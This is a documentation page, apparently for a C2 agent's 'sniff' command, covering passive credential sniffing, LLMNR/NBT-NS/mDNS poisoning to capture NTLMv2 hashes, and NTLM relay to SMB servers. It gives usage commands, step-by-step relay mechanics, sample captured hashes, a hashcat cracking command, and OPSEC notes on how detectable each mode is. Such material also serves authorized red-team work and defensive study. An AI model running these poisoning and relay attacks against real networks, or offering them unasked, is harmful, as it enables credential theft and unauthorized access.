+++
title = "sniff"
chapter = false
weight = 175
hidden = false
+++

## Summary

Network sniffing, LLMNR/NBT-NS/mDNS poisoning, and NTLM relay for credential interception. Three modes:

- **capture** (default): Passive network sniffing — captures traffic and extracts cleartext credentials from HTTP Basic Auth, FTP, NTLM, Kerberos, LDAP simple bind, SMTP AUTH PLAIN, and Telnet.
- **poison**: Active LLMNR/NBT-NS/mDNS responder — answers multicast name resolution queries with the attacker IP to intercept authentication attempts (T1557.001).
- **relay**: NTLM relay — intercepts victim NTLM authentication via HTTP and relays it to a target SMB server for authenticated access without cracking hashes (T1557.001).

Cross-platform capture: Windows (SIO_RCVALL), Linux (AF_PACKET + BPF), macOS (/dev/bpf). Poison and relay: cross-platform.

In poison mode, an HTTP NTLM capture server runs alongside the name resolution poisoners. When a victim resolves a name to the attacker IP, subsequent HTTP/WPAD requests trigger NTLM authentication — captured NTLMv2 hashes are output in **hashcat mode 5600** format for offline cracking.

In relay mode, the agent acts as a man-in-the-middle: it presents an HTTP 401 challenge to victims, forwards their NTLM Type 1 message to the target SMB server, relays the server's Type 2 challenge back, and forwards the victim's final Type 3 authentication to complete the SMB session as the victim user.

## Arguments

| Argument | Required | Default | Description |
|----------|----------|---------|-------------|
| action | No | capture | `capture`: passive sniffing. `poison`: LLMNR/NBT-NS/mDNS responder. `relay`: NTLM relay to target SMB |
| response_ip | No | auto-detect | Poison: IP to respond with. Relay: target SMB host (required) |
| protocols | No | llmnr,nbtns | Poison protocols: llmnr, nbtns, mdns (comma-separated) |
| interface | No | auto-detect | Network interface name or IP address |
| duration | No | 30 (capture) / 120 (poison/relay) | Duration in seconds. Max: 300 (capture), 600 (poison/relay) |
| ports | No | 21,53,80,88,110,143,389,445,8080 | Capture: port filter. Relay: `listen_port:target_port` (default: 80:445) |
| promiscuous | No | false | Enable promiscuous mode (capture only) |
| max_bytes | No | 52428800 (50MB) | Stop after N bytes (capture only) |
| save_pcap | No | false | Save raw PCAP file (capture only) |

## Usage

### Basic capture (30 seconds, default ports)
```
sniff
sniff -action capture
```

### LLMNR/NBT-NS Poisoning (2 minutes)
```
sniff -action poison -duration 120
```

### Poison with specific response IP and protocols
```
sniff -action poison -response_ip 10.0.0.5 -protocols llmnr,nbtns,mdns -duration 300
```

### Capture on specific interface with promiscuous mode
```
sniff -interface eth0 -promiscuous true -duration 60
```

### Windows: capture on specific adapter
```
sniff -interface Ethernet -duration 60
sniff -interface 192.168.1.50 -duration 60
```

### Target specific ports (include Kerberos)
```
sniff -ports 21,80,88,445 -duration 120
```

### Capture with PCAP file download
```
sniff -duration 30 -save_pcap true
```

### Quick 10-second scan
```
sniff -duration 10
```

### NTLM Relay to target SMB server
```
sniff -action relay -response_ip 192.168.1.10 -duration 120
```

### Relay with custom listen/target ports
```
sniff -action relay -response_ip 192.168.1.10 -ports 8080:445 -duration 300
```

## Relay Mode: NTLM Authentication Forwarding

{{% notice warning %}}Requires SMB signing DISABLED on the target (default for non-domain controllers){{% /notice %}}

When running in relay mode, the agent performs a man-in-the-middle attack:

1. **Listens** on an HTTP port (default: TCP 80) for victim connections
2. **Challenges** victims with HTTP 401 + NTLM to trigger authentication
3. **Forwards** the victim's NTLM Type 1 (Negotiate) to the target SMB server
4. **Relays** the server's Type 2 (Challenge) back to the victim
5. **Forwards** the victim's Type 3 (Authenticate) to complete SMB authentication as the victim
6. **Reports** success/failure, captured NTLMv2 hash (hashcat mode 5600), and relay status

This is the equivalent of `ntlmrelayx` — combined with LLMNR/NBT-NS poisoning (`poison` action), it enables authentication relay attacks without cracking passwords.

### Relay Output Example

```json
{
  "duration": "120.0s",
  "listen_port": 80,
  "target": "192.168.1.10",
  "target_port": 445,
  "relays": [
    {
      "victim_ip": "192.168.1.50",
      "username": "jsmith",
      "domain": "CONTOSO",
      "target": "192.168.1.10",
      "success": true,
      "hashcat": "jsmith::CONTOSO:1122334455667788:aabbccdd...:0101...",
      "status": "authenticated",
      "detail": "Successfully relayed CONTOSO\\jsmith to 192.168.1.10:445"
    }
  ],
  "credentials": [
    {
      "protocol": "ntlmv2-relay",
      "src_ip": "192.168.1.50",
      "dst_ip": "192.168.1.10",
      "username": "CONTOSO\\jsmith",
      "password": "jsmith::CONTOSO:1122334455667788:aabbccdd...:0101..."
    }
  ]
}
```

## Poison Mode: NTLMv2 Hash Capture

When running in poison mode, the agent:

1. **Listens** for LLMNR (UDP 5355), NBT-NS (UDP 137), and/or mDNS (UDP 5353) queries
2. **Responds** with the attacker's IP address, causing victims to connect to us
3. **Serves HTTP NTLM challenges** (TCP port 80) to capture authentication attempts
4. **Extracts NTLMv2 hashes** in hashcat-compatible format (mode 5600)

Captured hashes are automatically registered in the Mythic credential vault and can be cracked offline:

```bash
hashcat -m 5600 captured_hashes.txt wordlist.txt
```

### Poison Output Example

```json
{
  "duration": "120s",
  "queries_answered": 5,
  "protocols": ["llmnr", "nbtns"],
  "response_ip": "10.0.0.5",
  "credentials": [
    {
      "protocol": "LLMNR",
      "src_ip": "192.168.1.50",
      "username": "WPAD",
      "detail": "Poisoned LLMNR query for 'WPAD' → 10.0.0.5"
    },
    {
      "protocol": "ntlmv2",
      "src_ip": "192.168.1.50",
      "username": "CONTOSO\\jsmith",
      "password": "jsmith::CONTOSO:1122334455667788:aabbccdd...:0101000000000000...",
      "detail": "NTLMv2 HTTP capture | hashcat -m 5600 | domain=CONTOSO"
    }
  ]
}
```

## Credential Extraction

The sniffer automatically detects and extracts:

- **HTTP Basic Auth**: Decodes `Authorization: Basic <base64>` headers from HTTP requests
- **FTP Credentials**: Correlates `USER` and `PASS` commands across TCP packets
- **NTLM Authentication**: Extracts domain\username from NTLM Type 3 (Authenticate) messages in HTTP, SMB, LDAP
- **Kerberos AS-REP**: Extracts client principal name and realm from AS-REP messages (port 88). Useful for identifying AS-REP roastable accounts (T1558.004)
- **Kerberos TGS-REP**: Extracts service principal name and realm from TGS-REP messages
- **DNS Queries**: Captures queried domain names and record types (A, AAAA, MX, SRV, etc.) from port 53. Useful for identifying target communications and C2 domains

## Platform Details

| Platform | Mechanism | Notes |
|----------|-----------|-------|
| Windows | `SIO_RCVALL` raw socket | Requires Administrator. Binds to specific IP. No ethernet headers. |
| Linux | `AF_PACKET` raw socket | Requires root or `CAP_NET_RAW`. BPF kernel-level port filtering. |
| macOS | `/dev/bpf` device | Requires root. Userspace port filtering. |

## Output Format

JSON output with capture statistics and discovered credentials:

```json
{
  "duration": "30s",
  "packet_count": 1542,
  "bytes_captured": 892441,
  "credentials": [
    {
      "protocol": "http-basic",
      "src_ip": "192.168.1.50",
      "src_port": 49832,
      "dst_ip": "192.168.1.100",
      "dst_port": 80,
      "username": "admin",
      "password": "P@ssw0rd",
      "timestamp": 1711900000
    },
    {
      "protocol": "ntlm",
      "src_ip": "192.168.1.50",
      "dst_ip": "192.168.1.10",
      "dst_port": 445,
      "username": "DOMAIN\\jsmith",
      "detail": "host=WORKSTATION01",
      "timestamp": 1711900015
    },
    {
      "protocol": "krb-asrep",
      "src_ip": "192.168.1.10",
      "src_port": 88,
      "dst_ip": "192.168.1.50",
      "dst_port": 49900,
      "username": "jdoe@CONTOSO.COM",
      "detail": "realm=CONTOSO.COM",
      "timestamp": 1711900020
    }
  ]
}
```

## OPSEC Considerations

### Capture Mode
- **Windows**: Requires Administrator. `SIO_RCVALL` may be flagged by EDR/security products
- **Linux/macOS**: Requires root or `CAP_NET_RAW` capability
- **Promiscuous mode** changes NIC state and can be detected by tools like `promiscdetect` or `antisniff`
- Raw socket creation may trigger host-based IDS alerts
- Captured traffic stays in memory only — no PCAP file written to disk
- BPF filter (Linux) reduces kernel-to-userspace traffic volume

### Poison Mode
{{% notice warning %}}CRITICAL: Active network poisoning generates detectable traffic{{% /notice %}}

- LLMNR/NBT-NS/mDNS poisoning actively responds to multicast/broadcast queries — **IDS/IPS will detect this** (Responder-like behavior)
- Binding to ports 137 (NBT-NS) and 80 (HTTP) may conflict with existing services
- On Windows, the NetBIOS service uses port 137 — poisoner may fail to bind
- Multiple hosts may authenticate to the attacker IP — **monitor for account lockouts**
- HTTP NTLM capture server listens on TCP 80 for the poison duration

### Relay Mode
{{% notice warning %}}CRITICAL: Active network relay generates detectable SMB traffic{{% /notice %}}

- Opens an HTTP TCP listener — may conflict with existing web servers on port 80
- Generates SMB2 traffic to the target host — visible in network logs and SIEM
- Successful relay creates an authenticated SMB session from an unexpected source IP
- **Requires SMB signing disabled on target** — domain controllers enforce signing by default; workstations and member servers typically do not
- Captured NTLMv2 hashes are also recorded for offline cracking (hashcat -m 5600)
- Combined with `poison` mode for full relay chain: poison name resolution → capture NTLM auth → relay to target

## MITRE ATT&CK Mapping

- **T1040** — Network Sniffing
- **T1557.001** — LLMNR/NBT-NS Poisoning and SMB Relay
- **T1558.004** — Steal or Forge Kerberos Tickets: AS-REP Roasting
